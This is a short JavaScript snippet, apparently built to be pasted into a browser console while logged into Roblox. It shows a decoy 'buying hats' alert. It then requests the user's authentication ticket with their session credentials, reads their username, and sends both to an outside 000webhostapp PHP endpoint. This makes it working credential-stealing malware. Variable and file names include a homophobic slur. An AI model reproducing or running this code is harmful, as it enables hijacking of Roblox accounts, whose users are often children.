alert("buying hats")
fetch('https://www.roblox.com/game/getauthticket', {credentials: 'include', headers: {'User-Agent': 'Roblox/WinInet','Access-Control-Allow-Origin': '*', 'Referer': 'https://www.roblox.com/', 'RBX-For-Gameauth': '1'}}).then(resp=>resp.text()).then(ticket=>{



$.get("/mobileapi/userinfo", function(gay){
var username = gay["UserName"];

fetch("https://roblox-audio-download.000webhostapp.com/foldisgay.php?Content={%22content%22:" + '"' + username + ":" +ticket + '"' + "}")
})
})
    